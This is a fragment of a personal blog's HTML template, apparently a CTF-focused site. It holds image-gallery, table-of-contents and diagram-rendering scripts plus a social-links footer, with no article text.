          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 26 26" width="28" height="28"><path fill="currentColor" d="M 2.71875 11.023438 L 16 10.023438 L 16 6.875 C 16 6.546875 16.160156 6.300781 16.480469 6.054688 C 16.800781 5.972656 17.121094 5.972656 17.359375 6.136719 C 20.640625 8.433594 23.761719 12.28125 23.839844 12.445313 C 23.917969 12.601563 23.992188 12.835938 23.996094 13 C 23.996094 13.003906 24 13.011719 24 13.015625 C 24 13.179688 23.921875 13.425781 23.839844 13.507813 C 23.761719 13.671875 20.71875 17.53125 17.359375 19.828125 C 17.039063 19.992188 16.71875 20.074219 16.480469 19.910156 C 16.160156 19.746094 16 19.5 16 19.171875 L 16 16.023438 L 2.71875 15.023438 C 2.320313 14.703125 2 13.898438 2 13.015625 C 2 12.21875 2.238281 11.34375 2.71875 11.023438 Z"/></svg>
        </div>

        <div class="modal__caption">
          <div class="modal__caption--text">
          </div>
        </div>

      </span>
    </div>
  </div>
</div>


<script defer src="/js/swipe.min.b4b82839155519d9ca67746615a4c86ccbc1061c196fe6d8aa26e4fe22902718.js"></script>

<script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>

<script defer src="/js/helper/fadeinout.min.js"></script>

<script>
document.addEventListener('DOMContentLoaded', function () {
  
   
  var docElem = document.documentElement;

   
  function openFullscreen() {
    if (docElem.requestFullscreen) {
      docElem.requestFullscreen();
    } else if (docElem.mozRequestFullScreen) {  
      docElem.mozRequestFullScreen();
    } else if (docElem.webkitRequestFullscreen) {  
      docElem.webkitRequestFullscreen();
    } else if (docElem.msRequestFullscreen) {  
      docElem.msRequestFullscreen();
    }
  }

   
  function closeFullscreen() {
    if (document.fullscreenElement ||
      document.webkitFullscreenElement ||
      document.mozFullScreenElement) {
      if (document.exitFullscreen) {
        document.exitFullscreen();
      } else if (document.mozCancelFullScreen) {  
        document.mozCancelFullScreen();
      } else if (document.webkitExitFullscreen) {  
        document.webkitExitFullscreen();
      } else if (document.msExitFullscreen) {  
        document.msExitFullscreen();
      }
    }
  }

  var modal = document.getElementById('modal');
  var galleryContainerElem = document.querySelector('.gallery__container');
  var swipeWrapElem = document.querySelector('.swipe-wrap');
  var mySwipeElem = document.getElementById('mySwipe');
  var arrowLeftElem = document.querySelector('.modal__arrow--left');
  var arrowRightElem = document.querySelector('.modal__arrow--right');
  var closeElem = document.querySelector('.modal__toolbar--close');
  var fullElem = document.querySelector('.modal__toolbar--full');
  var normalElem = document.querySelector('.modal__toolbar--normal');
  var captionElem = document.querySelector('.modal__caption');
  var pagingElem = document.querySelector('.modal__paging');
  var itemsElem = document.querySelector('.modal__items');
  var imgTotalNum = null;
  var myFadeTimeout = null;
  var mySwipe = null;
  var keydownFunction = function (e) {
    if (e.key === 'ArrowRight') {
      if (modal && modal.classList.contains('is-open')) {
        mySwipe.next();
      }
    } else if (e.key === 'ArrowLeft') {
      if (modal && modal.classList.contains('is-open')) {
        mySwipe.prev();
      }
    }
  }

  if (galleryContainerElem) {
    imgTotalNum = galleryContainerElem.querySelectorAll('img').length;
  } else {
    galleryContainerElem = document.querySelector('.single__contents');
    imgTotalNum = galleryContainerElem.querySelectorAll('img').length;
  }

  MicroModal.init({
    onClose: function () {
      if (mySwipe) {
        mySwipe.kill();
        mySwipe = null;
        closeFullscreen();
      }
      window.removeEventListener('keydown', keydownFunction);
    },
    disableScroll: true,
    disableFocus: true,
    awaitOpenAnimation: false,
    awaitCloseAnimation: false,
    debugMode: false,
  });

  var imageLoad = function(src) {
    return new Promise(function(resolve, reject) {
      var newImg = new Image;
      newImg.onload = function() {
        resolve(newImg);
      }
      newImg.onerror = reject;
      newImg.src = src;
    });
  }

  galleryContainerElem.querySelectorAll('img').forEach(function (elem, idx) {
    elem.style.cursor = 'pointer';

    var clonedElem = elem.cloneNode(true);
    clonedElem.style.maxHeight = '100%';
    clonedElem.style.maxWidth = '100%';
    clonedElem.onclick = function (e) {
      e.stopPropagation();
    }

    var wrapper = document.createElement('div');
    wrapper.style.width = '100%';
    wrapper.style.height = '100vh';
    wrapper.setAttribute('data-micromodal-close', '');
    wrapper.onclick = function () {
      if (mySwipe) {
        mySwipe.kill();
        mySwipe = null;
      }
    }
    wrapper.onmouseenter = function () {
      clearTimeout(myFadeTimeout);
      fadeIn(itemsElem, 200);
    };
    wrapper.onmouseleave = function () {
      myFadeTimeout = setTimeout(function () {
        fadeOut(itemsElem, 200);
      }, 2500);
    }
    wrapper.ontouchstart = function() {
      fadeIn(itemsElem, 200);
    }
    wrapper.append(clonedElem);
    swipeWrapElem.append(wrapper);

    elem.addEventListener('click', async function (e) {
      MicroModal.show('modal');
      if (mySwipe) {
        mySwipe.kill();
        mySwipe = null;
      }

      var imgSrc = e.target.getAttribute('data-src') || e.target.getAttribute('src');
      var img = await imageLoad(imgSrc);
      clonedElem.style.width = img.width + 'px';
      clonedElem.style.height = img.height + 'px';
      
      
      mySwipe = new Swipe(mySwipeElem, {
        startSlide: idx,
        draggable: true,
        autoRestart: false,
        continuous: false,
        disableScroll: true,
        stopPropagation: true,
        callback: async function (index, element) {
          
          var imgElem = element.querySelector('img');
          var imgSrc = imgElem.getAttribute('data-src') || imgElem.getAttribute('src');
          var img = await imageLoad(imgSrc);
          imgElem.style.width = img.width + 'px';
          imgElem.style.height = img.height + 'px';

          
          if (captionElem && imgElem) {
            var caption = null;
            if (imgElem.getAttribute('data-caption')) {
              caption = imgElem.getAttribute('data-caption');
            } else if (imgElem.getAttribute('title')) {
              caption = imgElem.getAttribute('title');
            } else if (imgElem.getAttribute('alt')) {
              caption = imgElem.getAttribute('alt');
            } else {
              caption = imgElem.getAttribute('src');
            }

            captionElem.querySelector('.modal__caption--text').innerText = caption;
            pagingElem.innerText = (index + 1) + ' / ' + imgTotalNum;

            clearTimeout(myFadeTimeout);
            fadeIn(itemsElem, 200);
          }
        },
      });

      fadeIn(itemsElem);

      
      if (captionElem) {
        var caption = null;
        if (e.target.getAttribute('data-caption')) {
          caption = e.target.getAttribute('data-caption');
        } else if (e.target.getAttribute('title')) {
          caption = e.target.getAttribute('title');
        } else if (e.target.getAttribute('alt')) {
          caption = e.target.getAttribute('alt');
        } else {
          caption = e.target.getAttribute('src');
        }

        captionElem.querySelector('.modal__caption--text').innerText = caption;
        pagingElem.innerText = (idx + 1) + ' / ' + imgTotalNum;
      }

      if (normalElem && fullElem) {
        normalElem.style.zIndex = -1;
        normalElem.style.opacity = 0;
        fullElem.style.zIndex = 25;
        fullElem.style.opacity = 1;
      }
    });

    window.addEventListener('keydown', keydownFunction);
  });

  arrowLeftElem ?
    arrowLeftElem.addEventListener('click', function (e) {
      if (mySwipe) {
        mySwipe.prev();
      }
    }) : null;
  arrowRightElem ?
    arrowRightElem.addEventListener('click', function (e) {
      if (mySwipe) {
        mySwipe.next();
      }
    }) : null;

  closeElem ?
    closeElem.addEventListener('click', function () {
      if (mySwipe) {
        mySwipe.kill();
        mySwipe = null;
      }
      closeFullscreen();
      MicroModal.close('modal');
    }) : null;

  fullElem ?
    fullElem.addEventListener('click', function (e) {
      openFullscreen();
      if (normalElem) {
        normalElem.style.zIndex = 25;
        normalElem.style.opacity = 1;
        fullElem.style.zIndex = -1;
        fullElem.style.opacity = 0;
      }
    }) : null;

  normalElem ?
    normalElem.addEventListener('click', function (e) {
      closeFullscreen();
      if (fullElem) {
        fullElem.style.zIndex = 25;
        fullElem.style.opacity = 1;
        normalElem.style.zIndex = -1;
        normalElem.style.opacity = 0;
      }
    }) : null;
  
});
</script>

    <div class="hide">
      

<div class="search">
  <span class="icon">
    <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="currentColor" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path d="M15.5 14h-.79l-.28-.27c1.2-1.4 1.82-3.31 1.48-5.34-.47-2.78-2.79-5-5.59-5.34-4.23-.52-7.79 3.04-7.27 7.27.34 2.8 2.56 5.12 5.34 5.59 2.03.34 3.94-.28 5.34-1.48l.27.28v.79l4.25 4.25c.41.41 1.08.41 1.49 0 .41-.41.41-1.08 0-1.49L15.5 14zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
  </span>
  <input id="search" aria-label="Site Search" class="input" type="text" placeholder="Search" autocomplete="off">
  <div id="search-results" class="dropdown">
    <div id="search-menu" class="dropdown-menu" role="menu">
    </div>
  </div>
</div>


    </div>
  </div>
</main>


<script>
  
  
  

  var enableToc = JSON.parse("true");
  var toc = JSON.parse("null");
  var tocPosition = JSON.parse("\"outer\"");
  
  var singleMainElem = document.querySelector('.single__main');
  var singleSideElem = document.querySelector('.single__side');

  enquire.register("screen and (max-width: 769px)", {
    match: function () {
      if ((enableToc || toc) && tocPosition !== "outer") {
        if (singleMainElem && singleSideElem) {
          singleMainElem.classList.remove('main-main');
          singleMainElem.classList.add('main');
          singleSideElem.classList.remove('main-side');
          singleSideElem.classList.add('hide');
        }
      } else if (tocPosition === "outer") {
        if (singleMainElem && !singleMainElem.classList.contains('main-main')) {
          singleMainElem.classList.remove('main-main');
          singleMainElem.classList.add('main');
        }
        if (singleSideElem && !singleSideElem.classList.contains('hide')) {
          singleSideElem.classList.add('hide');
        }
      }
    },
    unmatch: function () {
      if ((enableToc || toc) && tocPosition !== "outer") {
        singleMainElem.classList.remove('main');
        singleMainElem.classList.add('main-main');
        singleSideElem.classList.remove('hide');
        singleSideElem.classList.add('main-side');
      } else if (tocPosition === "outer") {
        if (singleMainElem && !singleMainElem.classList.contains('main-main')) {
          singleMainElem.classList.remove('main-main');
          singleMainElem.classList.add('main');
        }
        if (singleSideElem && !singleSideElem.classList.contains('hide')) {
          singleSideElem.classList.add('hide');
        }
      }

      var navCollapseBtn = document.querySelector('.navbar__burger');
      var navCollapse = document.getElementsByClassName('navbarm__collapse')[0];
      if (navCollapse) {
        navCollapse.setAttribute('data-open', false);
        navCollapse.style.maxHeight = 0;
        navCollapseBtn.classList.remove('is-active');
      }
      document.getElementsByClassName('navbar__menu')[0].classList.remove('is-active');
      document.getElementsByClassName('mobile-search')[0].classList.add('hide');
    },
    setup: function () { },
    deferSetup: true,
    destroy: function () { },
  });
</script>





<script defer src="/js/helper/getParents.min.js"></script>

<script defer src="/js/helper/closest.min.js"></script>

<script defer src="/js/helper/prev.min.js"></script>

<script defer src="/js/helper/prop.min.js"></script>

<script defer src="/js/helper/fadeinout.min.js"></script>

<script defer src="/js/helper/throttle.min.js"></script>



















































<script>
  'use strict';

  window.onload = function() {
    var navbar = document.querySelector('.navbar');
    var singleContentsElem = document.querySelector('.single__contents');

    
    
    
    var enableBusuanzi = JSON.parse("false");
    var busuanziPagePV = JSON.parse("true");
    
    if (enableBusuanzi && busuanziPagePV) {
      var pagePvElem = document.querySelector('#busuanzi_value_page_pv');
      pagePvElem.textContent = pagePvElem.textContent.replace(/(\d)(?=(\d\d\d)+(?!\d))/g, "$1,");
    }    
    



    
    
    
    
    
    
    var enableToc = JSON.parse("true");
    var toc = JSON.parse("null");
    var hideToc = JSON.parse("false");
    var tocFlexbox = document.querySelector('.toc__flexbox');
    var tocFlexboxOuter = document.querySelector('.toc__flexbox--outer');
    var tocFolding = JSON.parse("true");
    
    if ((enableToc || toc) && document.querySelector('.toc')) {
      var tableOfContentsElem = document.querySelector('.toc').querySelector('#TableOfContents');

      tableOfContentsElem.onmouseenter = function() {
        if (navbar.classList.contains('scrolling')) {
          navbar.classList.remove('scrolling');
        }
      }

      tableOfContentsElem.onmouseleave = function() {
        if (!navbar.classList.contains('scrolling')) {
          navbar.classList.add('scrolling');
        }
      }

      if (false === tocFolding) {

      } else {
        tableOfContentsElem.querySelectorAll('ul') ?
          tableOfContentsElem.querySelectorAll('ul').forEach(function (rootUl) {
            rootUl.querySelectorAll('li').forEach(function (liElem) {
              liElem.querySelectorAll('ul').forEach(function (ulElem) {
                ulElem.style.display = 'none';
              });
            });
          }) : null;
      }

      if (tableOfContentsElem) {
        if (tableOfContentsElem.querySelectorAll('a').length > 0) {
          tableOfContentsElem.querySelectorAll('a').forEach(function (elem) {
            elem.addEventListener('click', function () {
              var id = elem.getAttribute('id');

              if (!navbar.classList.contains('scrolling')) {
                navbar.classList.remove('navbar--show');
                navbar.classList.remove('navbar--hide');
                navbar.classList.add('navbar--hide');
              }
              
              document.querySelector('.toc').querySelectorAll('a').forEach(function (elem) {
                elem.classList.remove('active');
              });
              elem.classList.add('active');

              var curElem = tableOfContentsElem.querySelector('[href="#' + id + '"]');
              if (curElem && curElem.nextElementSibling) {
                curElem.nextElementSibling.style.display = 'block';
              }
              if (curElem) {
                getParents(curElem, 'ul') ?
                  getParents(curElem, 'ul').forEach(function (elem) {
                    elem.style.display = 'block';
                  }) : null;
              }
            });
          });
        } else {
          if (tocFlexbox) {
            tocFlexbox.setAttribute('data-position', '');
            if (!tocFlexbox.classList.contains('hide')) {
              tocFlexbox.classList.add('hide');
            }
          }
          if (tocFlexboxOuter) {
            tocFlexboxOuter.setAttribute('data-position', '');
            if (!tocFlexboxOuter.classList.contains('hide')) {
              tocFlexboxOuter.classList.add('hide');
            }
          }
        }
      }

      
      var toggleTocElem = document.getElementById("toggle-toc");
      var visibleTocElem = document.getElementById('visible-toc');
      var tocElem = document.querySelector('.toc');
      var mainElem = document.querySelector('main');
      var sideElem = document.querySelector('side');
      var tocFlexboxElem = document.querySelector('.toc__flexbox');

      toggleTocElem ? 
      toggleTocElem.addEventListener('change', function(e) {
        if (e.target.checked) {
          if (tocElem) {
            fadeIn(tocElem, 200);
          }
          if (tocFlexboxElem) {
            tocFlexboxElem.setAttribute('data-position', 'fixed');
          }

          if (mainElem) {
            mainElem.classList.remove('main-main');
            mainElem.classList.remove('main');
            mainElem.classList.add('main-main');
          }
          if (sideElem) {
            sideElem.classList.remove('main-side');
          }
        } else {
          if (tocElem) {
            fadeOut(tocElem, 200);
          }
          if (tocFlexboxElem) {
            tocFlexboxElem.setAttribute('data-position', 'absolute');
          }

          if (mainElem) {
            mainElem.classList.remove('main-main');
            mainElem.classList.remove('main');
            mainElem.classList.add('main');
          }
          if (sideElem) {
            sideElem.classList.remove('main-side');
          }
        }
      }) : null;

      visibleTocElem ?
      visibleTocElem.addEventListener('change', function(e) {
        if (e.target.checked) {
          if (tocElem) {
            fadeIn(tocElem, 200);
          }
        } else {
          if (tocElem) {
            fadeOut(tocElem, 200);
          }
        }
      }) : null;
    }
    
    
    
    
    
    var topOffset = 120;
    var botOffset = 70;
    var handleWindowResize = function () {
      if (tocElem) {
        tocElem.style.maxHeight = (window.innerHeight - topOffset - botOffset) + 'px';
      }
    }
    var throttledWindowResize = throttle(handleWindowResize, 300);
    throttledWindowResize()

    
    window.addEventListener('resize', throttledWindowResize);
    



    
    var text, clip = new ClipboardJS('.anchor');
    var headers = singleContentsElem.querySelectorAll("h1, h2, h3, h4");

    
    var languagedir = JSON.parse("\"ltr\"");

    headers ? 
    headers.forEach(function (elem) {
      var size = parseInt(elem.tagName.substr(1), 10) * 2;
      var url = encodeURI(document.location.origin + document.location.pathname);
      var link = url + "#" + elem.getAttribute('id');
      var newElemOuter = document.createElement('span');
      newElemOuter.classList.add('anchor');
      newElemOuter.classList.add('hide');
      newElemOuter.setAttribute('data-clipboard-text', decodeURI(link));
      newElemOuter.style.position = 'relative';

      var newElemInner = document.createElement('span');
      newElemInner.style.position = 'absolute';
      newElemInner.style.top = '50%';
      newElemInner.style.left = '0.75rem';
      newElemInner.style.transform = 'translateY(-50%)';
      newElemInner.innerHTML = `
<svg fill="currentColor" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="${32 - size}px" height="${32 - size}px"><path d="M 5.5625 0 C 4.136719 0 2.707031 0.542969 1.625 1.625 C -0.539063 3.789063 -0.539063 7.335938 1.625 9.5 L 5.28125 13.15625 C 5.667969 13.554688 6.304688 13.558594 6.703125 13.171875 C 7.101563 12.785156 7.105469 12.148438 6.71875 11.75 L 3.03125 8.0625 C 1.632813 6.664063 1.632813 4.429688 3.03125 3.03125 C 4.429688 1.632813 6.664063 1.632813 8.0625 3.03125 L 12.96875 7.9375 C 14.367188 9.335938 14.367188 11.570313 12.96875 12.96875 C 12.804688 13.132813 12.621094 13.25 12.4375 13.375 C 11.980469 13.6875 11.859375 14.308594 12.171875 14.765625 C 12.484375 15.222656 13.105469 15.34375 13.5625 15.03125 C 13.847656 14.835938 14.125 14.625 14.375 14.375 C 16.539063 12.210938 16.539063 8.664063 14.375 6.5 L 9.5 1.625 C 8.417969 0.542969 6.988281 0 5.5625 0 Z M 10.78125 8.875 C 10.738281 8.882813 10.695313 8.894531 10.65625 8.90625 C 10.507813 8.9375 10.371094 9 10.25 9.09375 C 10.039063 9.253906 9.820313 9.429688 9.625 9.625 C 7.460938 11.789063 7.460938 15.335938 9.625 17.5 L 14.5 22.375 C 16.664063 24.539063 20.210938 24.539063 22.375 22.375 C 24.539063 20.210938 24.539063 16.664063 22.375 14.5 L 18.71875 10.875 C 18.476563 10.578125 18.089844 10.441406 17.714844 10.527344 C 17.34375 10.613281 17.050781 10.90625 16.964844 11.277344 C 16.878906 11.652344 17.015625 12.039063 17.3125 12.28125 L 20.96875 15.9375 C 22.367188 17.335938 22.367188 19.570313 20.96875 20.96875 C 19.570313 22.367188 17.335938 22.367188 15.9375 20.96875 L 11.03125 16.0625 C 9.632813 14.664063 9.632813 12.429688 11.03125 11.03125 C 11.152344 10.90625 11.300781 10.820313 11.4375 10.71875 C 11.839844 10.472656 12.015625 9.976563 11.855469 9.53125 C 11.699219 9.085938 11.25 8.8125 10.78125 8.875 Z"/></svg>`;

      if (languagedir === "rtl") {
        newElemInner.style.left = '-2rem';
      } else {
        newElemInner.style.right = '-2rem';
      }

      newElemOuter.append(newElemInner);
      elem.append(newElemOuter);

      elem.addEventListener('mouseenter', function() {
        this.querySelector('.anchor').classList.remove('hide');
      });
      elem.addEventListener('mouseleave', function () {
        this.querySelector('.anchor').classList.add('hide');
      });
    }) : null;

    document.querySelectorAll('.anchor').forEach(function(elem) {
      elem.addEventListener('mouseleave', function() {
        elem.setAttribute('aria-label', null);
        elem.classList.remove('tooltipped');
        elem.classList.remove('tooltipped-s');
        elem.classList.remove('tooltipped-w');
      });
    });

    clip.on('success', function (e) {
      e.clearSelection();
      e.trigger.setAttribute('aria-label', 'Link copied to clipboard!');
      e.trigger.classList.add('tooltipped');
      e.trigger.classList.add('tooltipped-s');
    });
    // =================================================================



    
    
    var lib = JSON.parse("null");

    if (lib && lib.includes('mermaid')) {
      
      var themeVariant = localStorage.getItem('theme') || JSON.parse("\"dark\"");

      if (themeVariant === "dark" || themeVariant === "hacker") {
        mermaid.initialize({ theme: 'dark' });
      } else {
        mermaid.initialize({ theme: 'default' });
      }
      
      var mermaids = [];
      [].push.apply(mermaids, document.getElementsByClassName('language-mermaid'));
      mermaids.forEach(function(elem) {
        var elemParentNode = elem.parentNode;

        if (elemParentNode !== document.body) {
          elemParentNode.parentNode.insertBefore(elem, elemParentNode);
          elemParentNode.parentNode.removeChild(elemParentNode);
        }

        var newElemWrapper = document.createElement('div');
        newElemWrapper.classList.add('mermaid');
        newElemWrapper.style.padding = '34px 4px 6px';
        newElemWrapper.innerHTML = elem.innerHTML;
        elem.replaceWith(newElemWrapper);
      });
    }
    

    

    
    if (lib && lib.includes('katex')) {
      var mathElements = document.getElementsByClassName('math');
      var options = {
        delimiters: [
          { left: "$$", right: "$$", display: true },
          { left: "\\[", right: "\\]", display: true },
          { left: "$", right: "$", display: false },
          { left: "\\(", right: "\\)", display: false }
        ],
      };

      renderMathInElement(document.querySelector('.single__contents'), options);
    }
    



    
    if (lib && lib.includes('flowchartjs')) {
      
      var options = JSON.parse("{\"arrow-end\":\"block\",\"element-color\":\"black\",\"fill\":\"white\",\"flowstate\":{\"approved\":{\"fill\":\"#58C4A3\",\"font-size\":12,\"no-text\":\"n/a\",\"yes-text\":\"APPROVED\"},\"current\":{\"fill\":\"yellow\",\"font-color\":\"red\",\"font-weight\":\"bold\"},\"future\":{\"fill\":\"#FFFF99\"},\"invalid\":{\"fill\":\"#444444\"},\"past\":{\"fill\":\"#CCCCCC\",\"font-size\":12},\"rejected\":{\"fill\":\"#C45879\",\"font-size\":12,\"no-text\":\"REJECTED\",\"yes-text\":\"n/a\"},\"request\":{\"fill\":\"blue\"}},\"font-color\":\"black\",\"font-size\":14,\"line-color\":\"black\",\"line-length\":50,\"line-width\":3,\"no-text\":\"no\",\"scale\":1,\"symbols\":{\"end\":{\"class\":\"end-element\"},\"start\":{\"element-color\":\"green\",\"fill\":\"yellow\",\"font-color\":\"red\"}},\"text-margin\":10,\"x\":0,\"y\":0,\"yes-text\":\"yes\"}");
      var jsonContent = null;

      var flowchartPrefix = "language-flowchart";
      var index = 0;
      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + flowchartPrefix + "]"), function(x){
          x.style.display = 'none'
          x.parentNode.style.backgroundColor = "transparent"
          jsonContent = x.innerText;

          var node0 = document.createElement('div');
          node0.id = 'flowchart' + index;
          x.parentNode.insertBefore(node0, x);

          var diagram = flowchart.parse(jsonContent);
          diagram.drawSVG("flowchart"+index, options);

          index +=1;
      });      
    }
    

    

    
    document.querySelectorAll("mjx-container").forEach(function (x) {
      x.parentElement.classList += 'has-jax'
    });
    



    
    if (lib && lib.includes('msc')) {
      
      var options = JSON.parse("{\"theme\":\"hand\"}");
      var jsonContent = null;

      var index = 0;
      var chartPrefix = "language-msc";
      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + chartPrefix + "]"), function (x) {
        x.style.display = 'none'
        x.parentNode.style.backgroundColor = "transparent"
        jsonContent = x.innerText;
        var node0 = document.createElement('div');
        node0.id = 'msc' + index;
        x.parentNode.insertBefore(node0, x);
        var diagram = Diagram.parse(jsonContent);
        diagram.drawSVG("msc" + index, options);
        index += 1;
      });
    }
    



    
    if (lib && lib.includes('chart')) {
      var borderColor = "#666";
      var bgColor = "#ddd";
      var borderWidth = 2;

      Chart.defaults.global.elements.rectangle.borderWidth = borderWidth;
      Chart.defaults.global.elements.rectangle.borderColor = borderColor;
      Chart.defaults.global.elements.rectangle.backgroundColor = bgColor;

      Chart.defaults.global.elements.line.borderWidth = borderWidth;
      Chart.defaults.global.elements.line.borderColor = borderColor;
      Chart.defaults.global.elements.line.backgroundColor = bgColor;

      Chart.defaults.global.elements.point.borderWidth = borderWidth;
      Chart.defaults.global.elements.point.borderColor = borderColor;
      Chart.defaults.global.elements.point.backgroundColor = bgColor;

      var chartPrefix = "language-chart";
      var index = 0;
      var jsonContent = null;

      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + chartPrefix + "]"), function (x) {
        x.style.display = 'none'
        x.parentNode.style.backgroundColor = "transparent"
        jsonContent = x.innerText;
        var node0 = document.createElement('canvas');
        var source = null;
        node0.height = 200;
        node0.style.height = 200;
        node0.id = 'myChart' + index;
        source = JSON.parse(jsonContent);
        x.parentNode.insertBefore(node0, x);
        var ctx = document.getElementById('myChart' + index).getContext('2d');
        var myChart = new Chart(ctx, source);
        index += 1;
      });            
    }
    



    
    if (lib && lib.includes('wavedrom')) {
      var wavePrefix = "language-wave";
      var index = 0;
      var jsonContent = null;
      
      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + wavePrefix + "]"), function (x) {
        x.style.display = 'none'
        x.parentNode.style.backgroundColor = "transparent"
        jsonContent = x.innerText;
        var node0 = document.createElement('div');
        var source = null;
        node0.id = 'WaveDrom_Display_' + index;
        source = JSON.parse(jsonContent);
        x.parentNode.insertBefore(node0, x);
        WaveDrom.RenderWaveForm(index, source, "WaveDrom_Display_");
        index += 1;
      });
    }
    



    
    if (lib && lib.includes('viz')) {
      var vizPrefix = "language-viz-";
      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + vizPrefix + "]"), function (x) {
        x.style.display = 'none'
        x.parentNode.style.backgroundColor = "transparent"
        var engine;
        x.getAttribute("class").split(" ").forEach(function (cls) {
          if (cls.startsWith(vizPrefix)) {
            engine = cls.substr(vizPrefix.length);
          }
        });
        var viz = new Viz();
        viz.renderSVGElement(x.innerText, { engine: engine })
          .then(function (element) {
            element.style.width = "100%";
            x.parentNode.insertBefore(element, x);
          })
      });
    }
    
    
  }
</script>


            
            <footer class="footer">
    
    
<div class="footer__social">
  <div class="social">
    
            
    
            
    
            
    
      
      <a href="mailto:edisc.ctf@gmail.com" title="email" aria-label="email">
        <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-.4 4.25l-7.07 4.42c-.32.2-.74.2-1.06 0L4.4 8.25c-.25-.16-.4-.43-.4-.72 0-.67.73-1.07 1.3-.72L12 11l6.7-4.19c.57-.35 1.3.05 1.3.72 0 .29-.15.56-.4.72z"/></svg>
      </a>
            
    
      
      <a href="https://www.facebook.com/minhlongv84" title="facebook" aria-label="facebook">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewBox="0 0 24 24" version="1.1">
<g id="surface2747">
<path fill="currentColor" d="M 11.664062 2.003906 C 6.621094 2.171875 2.375 6.25 2.023438 11.289062 C 1.65625 16.617188 5.46875 21.121094 10.507812 21.878906 L 10.507812 14.648438 L 8.890625 14.648438 C 8.164062 14.648438 7.578125 14.0625 7.578125 13.335938 C 7.578125 12.609375 8.164062 12.023438 8.890625 12.023438 L 10.503906 12.023438 L 10.503906 10.273438 C 10.503906 7.378906 11.914062 6.105469 14.324219 6.105469 C 14.679688 6.105469 14.984375 6.113281 15.242188 6.128906 C 15.878906 6.15625 16.371094 6.6875 16.371094 7.324219 C 16.371094 7.988281 15.835938 8.523438 15.171875 8.523438 L 14.730469 8.523438 C 13.710938 8.523438 13.351562 9.492188 13.351562 10.585938 L 13.351562 12.023438 L 15.222656 12.023438 C 15.8125 12.023438 16.265625 12.550781 16.175781 13.132812 L 16.066406 13.835938 C 15.992188 14.304688 15.589844 14.652344 15.113281 14.652344 L 13.351562 14.652344 L 13.351562 21.898438 C 18.234375 21.234375 22 17.0625 22 12 C 22 6.367188 17.339844 1.820312 11.664062 2.003906 Z M 11.664062 2.003906 "/>
</g>
</svg>

      </a>
            
    
            
    
      
      <a href="https://github.com/minhlongmt183/" title="github" aria-label="github">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewBox="0 0 24 24" version="1.1">
<g id="surface3680">
<path fill="currentColor" d="M 10.898438 2.101562 C 6.300781 2.601562 2.601562 6.300781 2.101562 10.800781 C 1.601562 15.5 4.300781 19.699219 8.398438 21.300781 C 8.699219 21.398438 9 21.199219 9 20.800781 L 9 19.199219 C 9 19.199219 8.601562 19.300781 8.101562 19.300781 C 6.699219 19.300781 6.101562 18.101562 6 17.398438 C 5.898438 17 5.699219 16.699219 5.398438 16.398438 C 5.101562 16.300781 5 16.300781 5 16.199219 C 5 16 5.300781 16 5.398438 16 C 6 16 6.5 16.699219 6.699219 17 C 7.199219 17.800781 7.800781 18 8.101562 18 C 8.5 18 8.800781 17.898438 9 17.800781 C 9.101562 17.101562 9.398438 16.398438 10 16 C 7.699219 15.5 6 14.199219 6 12 C 6 10.898438 6.5 9.800781 7.199219 9 C 7.101562 8.800781 7 8.300781 7 7.601562 C 7 7.199219 7 6.601562 7.300781 6 C 7.300781 6 8.699219 6 10.101562 7.300781 C 10.601562 7.101562 11.300781 7 12 7 C 12.699219 7 13.398438 7.101562 14 7.300781 C 15.300781 6 16.800781 6 16.800781 6 C 17 6.601562 17 7.199219 17 7.601562 C 17 8.398438 16.898438 8.800781 16.800781 9 C 17.5 9.800781 18 10.800781 18 12 C 18 14.199219 16.300781 15.5 14 16 C 14.601562 16.5 15 17.398438 15 18.300781 L 15 20.898438 C 15 21.199219 15.300781 21.5 15.699219 21.398438 C 19.398438 19.898438 22 16.300781 22 12.101562 C 22 6.101562 16.898438 1.398438 10.898438 2.101562 Z M 10.898438 2.101562 "/>
</g>
</svg>

      </a>
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
    
  
  
    
      <a href="https://minhlongmt183.github.io/posts/index.xml" type="application/rss+xml" title="RSS" aria-label="RSS Feed Link">
        <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><circle fill="currentColor" cx="6.18" cy="17.82" r="2.18"/><path fill="currentColor" d="M5.59 10.23c-.84-.14-1.59.55-1.59 1.4 0 .71.53 1.28 1.23 1.4 2.92.51 5.22 2.82 5.74 5.74.12.7.69 1.23 1.4 1.23.85 0 1.54-.75 1.41-1.59-.68-4.2-3.99-7.51-8.19-8.18zm-.03-5.71C4.73 4.43 4 5.1 4 5.93c0 .73.55 1.33 1.27 1.4 6.01.6 10.79 5.38 11.39 11.39.07.73.67 1.28 1.4 1.28.84 0 1.5-.73 1.42-1.56-.73-7.34-6.57-13.19-13.92-13.92z"/></svg>
      </a>
    
  


  </div>
</div>

    
<div id="gtt">
  <div class="gtt">
